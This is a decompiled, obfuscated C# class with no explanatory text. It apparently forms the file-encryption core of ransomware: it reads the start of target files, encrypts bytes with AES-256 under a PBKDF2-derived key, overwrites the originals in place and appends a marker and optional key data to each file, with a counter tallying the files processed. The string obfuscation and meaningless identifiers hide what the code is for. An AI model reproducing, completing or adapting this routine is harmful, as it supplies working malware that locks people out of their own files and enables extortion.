using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class NQdDIFAnEzVM
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] SvtZMRYDytMixf(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = XEFUMsPltov(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes XEFUMsPltov(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] KQanXSigbuDh(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (GhAMvbuoccW.QtTrkEhpkGUJgMO == getString_0(107396843))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.dtHHyJMWMTcTg, getString_0(107387025) + string_0 + getString_0(107400321) + ex.Message + getString_0(107395763));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool EHTmbBVFpgxa(string zTKGzNBbRH, byte[] AaZhmxjLrXnGZ, byte[] KJxeENlSQsJIpV = null)
	{
		try
		{
			byte[] array = null;
			if (GhAMvbuoccW.QtTrkEhpkGUJgMO == getString_0(107396843))
			{
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231))) : Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(zTKGzNBbRH, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(AaZhmxjLrXnGZ, 0, AaZhmxjLrXnGZ.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(zTKGzNBbRH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GhAMvbuoccW.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(KJxeENlSQsJIpV, 0, KJxeENlSQsJIpV.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231))) : Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240))));
				FileStream fileStream2 = new FileStream(zTKGzNBbRH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(AaZhmxjLrXnGZ, 0, AaZhmxjLrXnGZ.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(zTKGzNBbRH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GhAMvbuoccW.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(KJxeENlSQsJIpV, 0, KJxeENlSQsJIpV.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			GhAMvbuoccW.qXIAEocyZgLqByS++;
		}
		catch (Exception ex)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.dtHHyJMWMTcTg, getString_0(107387025) + zTKGzNBbRH + getString_0(107400254) + ex.Message + getString_0(107395763));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400231))) : Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.nmjDhIwEGnMOrO) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240)) + Convert.ToString(GhAMvbuoccW.UawyhGBHBLgS) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400240))));
				FileStream fileStream2 = new FileStream(zTKGzNBbRH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(AaZhmxjLrXnGZ, 0, AaZhmxjLrXnGZ.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(zTKGzNBbRH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!GhAMvbuoccW.PAOJgADrbjEa)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(KJxeENlSQsJIpV, 0, KJxeENlSQsJIpV.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static NQdDIFAnEzVM()
	{
		Strings.CreateGetStringDelegate(typeof(NQdDIFAnEzVM));
	}
}
